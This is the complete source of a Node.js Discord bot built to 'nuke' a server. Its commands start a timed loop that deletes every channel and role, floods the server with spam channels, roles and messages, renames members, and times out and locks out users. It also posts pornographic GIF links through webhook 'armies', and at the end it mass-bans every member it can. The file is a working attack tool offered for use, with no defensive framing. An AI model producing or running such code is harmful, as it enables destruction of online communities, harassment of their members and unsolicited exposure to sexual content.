require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionFlagsBits,
  Colors,
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';
const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // 28 days
const NUKE_DURATION = 5 * 60 * 1000;

let nukeActive = false;
let currentMode = 'normal';
let ticking = false;
let nukeTimeout = null;

// ================== CACHES ==================
const cache = {
  members: new Map(),
  webhooks: new Map(),
  lastActions: new Map(),
};

function getCachedMembers(guildId) {
  const entry = cache.members.get(guildId);
  if (entry && entry.expires > Date.now()) return entry.data;
  return null;
}

function setCachedMembers(guildId, data, ttl = 15000) {
  cache.members.set(guildId, { data, expires: Date.now() + ttl });
}

async function smartMembers(guild, force = false) {
  if (!force) {
    const cached = getCachedMembers(guild.id);
    if (cached) return cached;
  }
  const members = await guild.members.fetch().catch(() => null);
  if (members) setCachedMembers(guild.id, members);
  return members;
}

async function smartWebhook(channel, name = 'Minion') {
  const key = `${channel.id}:${name}`;
  if (cache.webhooks.has(key)) return cache.webhooks.get(key);

  try {
    const hooks = await channel.fetchWebhooks();
    let wh = hooks.find(h => h.name === name);
    if (!wh) wh = await channel.createWebhook({ name, reason: 'Smart Chaos' });
    cache.webhooks.set(key, wh);
    return wh;
  } catch {
    return null;
  }
}

// ================== DATA ==================
const GIF_TYPE_1 = ['https://klipy.com/gifs/orgasm-cumming-1'];
const GIF_TYPE_2 = ['https://klipy.com/gifs/vegan-porn-carrot-porn'];

const SERVER_NAMES = [
  'NUKED', 'SMART CHAOS', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
  'NO ESCAPE', 'WEBHOOK ARMY', 'OVERPOWERED', 'VERY AGGRESSIVE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'chaos', 'void', 'pain', 'end',
  'glitch', 'error', 'deleted', 'mute-zone', 'screaming', 'final',
  'minion-spam', 'boss-room', 'collapse', 'army', 'flood', 'wave',
  'aggro', 'rage', 'kill', 'smart', 'pressure'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'BOT PROPERTY', 'NO HOPE', 'DESTROYED',
  'VICTIM', 'MINION FOOD', 'MUTED', 'SILENCED', 'BROKEN', 'ARMY TARGET',
  'BOSS TARGET', 'SMART CHAOS', 'PRESSURED'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'Bot Property', 'Minion', 'Glitch',
  'Muted', 'Chaos', 'Victim', 'Army', 'Rage', 'Doomed', 'Smart'
];

const MESSAGES = [
  '**SMART CHAOS**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
  'OWNED', 'THE END', 'YOU CANNOT STOP THIS', 'BOT WINS',
  'MINIONS ARE HELPING', 'ARMY INCOMING', 'FULL PRESSURE',
  'PARALLEL DESTRUCTION', 'VERY AGGRESSIVE', 'SMART MODE'
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos',
  'Destroyer', 'Void', 'Glitch', 'Overlord', 'Rage'
];

const ARMY_MESSAGES = [
  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
  'no survivors', 'gif spam', 'webhook army', 'we are many',
  'collapse', 'smart chaos', 'very aggressive'
];

// ================== UTILS ==================
function randomItem(arr) {
  if (!arr?.length) return null;
  return arr[(Math.random() * arr.length) | 0];
}

function chance(p) {
  return Math.random() * 100 < p;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function canRun(key, cooldownMs) {
  const last = cache.lastActions.get(key) || 0;
  if (Date.now() - last < cooldownMs) return false;
  cache.lastActions.set(key, Date.now());
  return true;
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  return channel.delete('Smart Chaos').catch(() => {});
}

function snapshot(guild) {
  const textChannels = guild.channels.cache.filter(
    c => c.type === ChannelType.GuildText && c.manageable
  );
  const allChannels = guild.channels.cache.filter(c => c.manageable);
  const roles = guild.roles.cache.filter(r => r.editable && r.id !== guild.id);
  const webhookable = textChannels.filter(c =>
    c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
  );

  return {
    textChannels,
    allChannels,
    roles,
    webhookable,
    textCount: textChannels.size,
    roleCount: roles.size,
    webhookCount: webhookable.size,
  };
}

// ================== LIVE COMMANDS: !ban / !mute ==================
async function massBan(guild, message) {
  if (message) await message.reply('🔪 **Mass ban started...**');

  const members = await smartMembers(guild, true); // force fresh
  if (!members) {
    if (message) await message.reply('❌ Could not fetch members.');
    return;
  }

  let banned = 0, failed = 0;

  await Promise.allSettled(
    [...members.values()].map(async (m) => {
      if (m.user.bot || m.id === guild.ownerId) return;
      try {
        if (m.bannable) {
          await m.ban({ reason: 'Manual !ban' });
          banned++;
        } else failed++;
      } catch {
        failed++;
      }
    })
  );

  const text = `✅ Mass ban done → **Banned: ${banned}** | Failed: ${failed}`;
  console.log(text);
  if (message) await message.reply(text).catch(() => {});
}

async function massMute(guild, message) {
  if (message) await message.reply('🔇 **Mass mute started...**');

  const members = await smartMembers(guild, true);
  if (!members) {
    if (message) await message.reply('❌ Could not fetch members.');
    return;
  }

  let muted = 0, failed = 0;

  await Promise.allSettled(
    [...members.values()].map(async (m) => {
      if (m.user.bot || m.id === guild.ownerId) return;
      try {
        if (m.moderatable) {
          await m.timeout(FINAL_TIMEOUT, 'Manual !mute');
          muted++;
        } else failed++;
      } catch {
        failed++;
      }
    })
  );

  const text = `✅ Mass mute done → **Muted: ${muted}** | Failed: ${failed}`;
  console.log(text);
  if (message) await message.reply(text).catch(() => {});
}

// ================== FINAL BAN WAVE (auto after 5 min) ==================
async function finalBanWave(guild) {
  console.log('🔪 AUTO FINAL BAN WAVE...');
  const members = await smartMembers(guild, true);
  if (!members) return;

  let banned = 0, timedOut = 0, failed = 0;

  await Promise.allSettled(
    [...members.values()].map(async (m) => {
      if (m.user.bot || m.id === guild.ownerId) return;

      try {
        if (m.bannable) {
          await m.ban({ reason: 'Smart Chaos - Final Wave' });
          banned++;
          return;
        }
      } catch {}

      try {
        if (m.moderatable) {
          await m.timeout(FINAL_TIMEOUT, 'Smart Chaos - Fallback');
          timedOut++;
          return;
        }
      } catch {}

      failed++;
    })
  );

  console.log(`✅ Auto wave → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
}

// ================== SMART ACTIONS ==================
const actions = {
  async renameServer(guild) {
    if (!canRun('rename', 8000)) return false;
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
    return true;
  },

  async wipeChannels(guild, state) {
    if (state.textCount < 2) return false;
    if (!canRun('wipeChannels', 6000)) return false;
    await Promise.allSettled([...state.allChannels.values()].map(safeDelete));
    return true;
  },

  async floodChannels(guild) {
    if (!canRun('floodChannels', 4000)) return false;
    const count = currentMode === 'very' ? 14 : 9;
    await Promise.allSettled(
      Array.from({ length: count }, () =>
        guild.channels
          .create({ name: randomItem(CHANNEL_NAMES), type: ChannelType.GuildText })
          .then(ch => ch.send(randomItem(MESSAGES)).catch(() => {}))
          .catch(() => {})
      )
    );
    return true;
  },

  async flashChannels(guild) {
    if (!canRun('flash', 5000)) return false;
    const count = currentMode === 'very' ? 8 : 5;
    await Promise.allSettled(
      Array.from({ length: count }, () =>
        guild.channels
          .create({
            name: randomItem(['temp', 'flash', 'glitch', 'rage', 'op']),
            type: ChannelType.GuildText,
          })
          .then(async ch => {
            ch.send('👁').catch(() => {});
            setTimeout(() => ch.delete().catch(() => {}), 1200 + Math.random() * 2000);
          })
          .catch(() => {})
      )
    );
    return true;
  },

  async wipeRoles(guild, state) {
    if (state.roleCount < 1) return false;
    if (!canRun('wipeRoles', 7000)) return false;
    await Promise.allSettled(
      [...state.roles.values()].map(r => r.delete('Smart Chaos').catch(() => {}))
    );
    return true;
  },

  async floodRoles(guild) {
    if (!canRun('floodRoles', 5000)) return false;
    const count = currentMode === 'very' ? 12 : 7;
    await Promise.allSettled(
      Array.from({ length: count }, () =>
        guild.roles
          .create({
            name: randomItem(ROLE_NAMES),
            color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange]),
            reason: 'Smart Chaos',
          })
          .catch(() => {})
      )
    );
    return true;
  },

  async nicknameHell(guild) {
    if (!canRun('nicks', 8000)) return false;
    const members = await smartMembers(guild);
    if (!members) return false;
    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
    );
    return true;
  },

  async muteHell(guild) {
    if (!canRun('mutes', 9000)) return false;
    const members = await smartMembers(guild);
    if (!members) return false;
    const times =
      currentMode === 'very'
        ? [3600, 7200, 14400, 28800]
        : [1800, 3600, 7200, 14400];

    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.moderatable)
        .map(m => {
          const t = times[(Math.random() * times.length) | 0] * 1000;
          return m.timeout(t, 'Smart Chaos').catch(() => {});
        })
    );
    return true;
  },

  async spamMessages(guild, state) {
    if (state.textCount < 1) return false;
    if (!canRun('spam', 3000)) return false;
    const spam = currentMode === 'very' ? 7 : 4;
    const tasks = [];
    for (const ch of state.textChannels.values()) {
      if (!ch.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)) continue;
      for (let i = 0; i < spam; i++) {
        tasks.push(ch.send(randomItem(MESSAGES)).catch(() => {}));
      }
    }
    await Promise.allSettled(tasks);
    return true;
  },

  async lockPerms(guild, state) {
    if (state.textCount < 1) return false;
    if (!canRun('lock', 10000)) return false;
    await Promise.allSettled(
      [...state.allChannels.values()].map(ch =>
        ch.permissionOverwrites
          .edit(guild.roles.everyone, {
            ViewChannel: chance(currentMode === 'very' ? 4 : 10),
            SendMessages: false,
            Connect: false,
            Speak: false,
            AddReactions: false,
          })
          .catch(() => {})
      )
    );
    return true;
  },

  async botNick(guild) {
    guild.members.me
      ?.setNickname(
        randomItem([
          currentMode === 'very' ? 'VERY AGGRESSIVE' : 'SMART CHAOS',
          'OVERLORD', 'THE DESTROYER', 'ARMY COMMANDER', 'PARALLEL CHAOS',
        ])
      )
      .catch(() => {});
    return true;
  },

  async roleAssign(guild, state) {
    if (state.roleCount < 1) return false;
    if (!canRun('assign', 8000)) return false;
    const members = await smartMembers(guild);
    if (!members) return false;
    const roles = [...state.roles.values()];
    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => {
          const role = randomItem(roles);
          return role ? m.roles.add(role).catch(() => {}) : Promise.resolve();
        })
    );
    return true;
  },

  async armyGif(guild, state) {
    if (state.webhookCount < 1) return false;
    if (!canRun('armyGif', 4000)) return false;

    const nameCount = currentMode === 'very' ? 10 : 6;
    const per = currentMode === 'very' ? 3 : 2;
    const tasks = [];

    for (const ch of state.webhookable.values()) {
      for (const name of ARMY_NAMES.slice(0, nameCount)) {
        tasks.push(
          (async () => {
            const wh = await smartWebhook(ch, name);
            if (!wh) return;
            await Promise.allSettled(
              Array.from({ length: per }, () => {
                const gif =
                  Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
                return wh
                  .send({ content: gif || randomItem(ARMY_MESSAGES), username: name })
                  .catch(() => {});
              })
            );
          })()
        );
      }
    }
    await Promise.allSettled(tasks);
    return true;
  },

  async armyText(guild, state) {
    if (state.webhookCount < 1) return false;
    if (!canRun('armyText', 3500)) return false;

    const loops = currentMode === 'very' ? 7 : 4;
    const tasks = [];
    for (const ch of state.webhookable.values()) {
      for (let i = 0; i < loops; i++) {
        tasks.push(
          (async () => {
            const wh = await smartWebhook(ch, randomItem(ARMY_NAMES));
            if (!wh) return;
            await wh
              .send({
                content: randomItem(ARMY_MESSAGES),
                username: randomItem(ARMY_NAMES),
              })
              .catch(() => {});
          })()
        );
      }
    }
    await Promise.allSettled(tasks);
    return true;
  },

  async armyCreate(guild) {
    if (!canRun('armyCreate', 6000)) return false;
    const count = currentMode === 'very' ? 6 : 3;
    await Promise.allSettled(
      Array.from({ length: count }, () =>
        (async () => {
          try {
            const ch = await guild.channels.create({
              name: randomItem(['army-spam', 'wave', 'flood', 'smart']),
              type: ChannelType.GuildText,
            });
            await Promise.allSettled(
              ARMY_NAMES.slice(0, 3).map(async name => {
                const wh = await smartWebhook(ch, name);
                if (!wh) return;
                const gif =
                  Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
                return wh
                  .send({ content: gif || randomItem(ARMY_MESSAGES), username: name })
                  .catch(() => {});
              })
            );
          } catch {}
        })()
      )
    );
    return true;
  },

  async armySymbols(guild, state) {
    if (state.webhookCount < 1) return false;
    if (!canRun('symbols', 5000)) return false;
    await Promise.allSettled(
      [...state.webhookable.values()].map(async ch => {
        const wh = await smartWebhook(ch, 'Glitch');
        if (!wh) return;
        await wh
          .send({
            content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌']),
            username: randomItem(['Glitch', 'Null', 'Error', 'Void']),
          })
          .catch(() => {});
      })
    );
    return true;
  },
};

const BOSS_POOL = [
  { fn: actions.renameServer, weight: 2 },
  { fn: actions.wipeChannels, weight: 4 },
  { fn: actions.floodChannels, weight: 5 },
  { fn: actions.flashChannels, weight: 3 },
  { fn: actions.wipeRoles, weight: 3 },
  { fn: actions.floodRoles, weight: 4 },
  { fn: actions.nicknameHell, weight: 4 },
  { fn: actions.muteHell, weight: 4 },
  { fn: actions.spamMessages, weight: 5 },
  { fn: actions.lockPerms, weight: 3 },
  { fn: actions.botNick, weight: 1 },
  { fn: actions.roleAssign, weight: 3 },
];

const ARMY_POOL = [
  { fn: actions.armyGif, weight: 5 },
  { fn: actions.armyText, weight: 4 },
  { fn: actions.armyCreate, weight: 3 },
  { fn: actions.armySymbols, weight: 2 },
];

function pickWeighted(pool, count) {
  const copy = [...pool];
  const picked = [];
  for (let i = 0; i < count && copy.length; i++) {
    const total = copy.reduce((s, x) => s + x.weight, 0);
    let r = Math.random() * total;
    let idx = 0;
    for (let j = 0; j < copy.length; j++) {
      r -= copy[j].weight;
      if (r <= 0) {
        idx = j;
        break;
      }
    }
    picked.push(copy[idx].fn);
    copy.splice(idx, 1);
  }
  return picked;
}

// ================== SMART TICK ==================
async function runSmartTick(guild) {
  if (!guild || ticking) return;
  if (!guild.members.me?.permissions?.has(PermissionFlagsBits.Administrator)) return;

  ticking = true;
  const start = Date.now();
  const state = snapshot(guild);

  const bossCount = currentMode === 'very' ? 9 : 6;
  const armyCount = currentMode === 'very' ? 4 : 2;

  const bossFns = pickWeighted(BOSS_POOL, bossCount);
  const armyFns = pickWeighted(ARMY_POOL, armyCount);

  await Promise.allSettled([
    ...bossFns.map(fn => fn(guild, state)),
    ...armyFns.map(fn => fn(guild, state)),
  ]);

  console.log(
    `⚡ SMART ${currentMode.toUpperCase()} tick | ${Date.now() - start}ms | ch:${state.textCount} roles:${state.roleCount}`
  );
  ticking = false;
}

async function nukeLoop(guild) {
  const base = currentMode === 'very' ? 1600 : 3200;
  while (nukeActive) {
    const t0 = Date.now();
    await runSmartTick(guild);
    const elapsed = Date.now() - t0;
    await sleep(Math.max(base - elapsed, 150));
  }
}

async function startNuke(guild, message, mode = 'normal') {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Already running.');
    return;
  }

  currentMode = mode;
  nukeActive = true;
  cache.members.delete(guild.id);

  if (message) {
    await message.reply(
      mode === 'very'
        ? '💣 **VERY AGGRESSIVE SMART MODE**\nYou can still use `!ban` / `!mute` anytime.'
        : '💣 **SMART CHAOS MODE**\nYou can still use `!ban` / `!mute` anytime.'
    );
  }

  console.log(`💣 SMART NUKE STARTED → ${mode.toUpperCase()}`);
  nukeLoop(guild);

  nukeTimeout = setTimeout(async () => {
    nukeActive = false;
    console.log('⏰ 5 MIN OVER → AUTO BAN WAVE');
    await finalBanWave(guild);
    console.log('🛑 SMART NUKE ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log('🧠 SMART CHAOS BOT READY');
  console.log('→ !nuke / !NUKE  = start chaos');
  console.log('→ !ban           = mass ban (works during nuke)');
  console.log('→ !mute          = mass mute 28d (works during nuke)');
  console.log('→ !nuke-stop     = stop chaos');
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member?.permissions?.has(PermissionFlagsBits.Administrator)) return;

  const content = message.content.trim();

  // Nuke modes
  if (content === '!NUKE') {
    await startNuke(message.guild, message, 'very');
    return;
  }
  if (content === '!nuke') {
    await startNuke(message.guild, message, 'normal');
    return;
  }

  // Live mass actions (work anytime, including during nuke)
  if (content === '!ban') {
    await massBan(message.guild, message);
    return;
  }
  if (content === '!mute') {
    await massMute(message.guild, message);
    return;
  }

  // Stop
  if (content === '!nuke-stop' || content === '!NUKE-STOP') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped.');
  }
});

client.login(TOKEN);
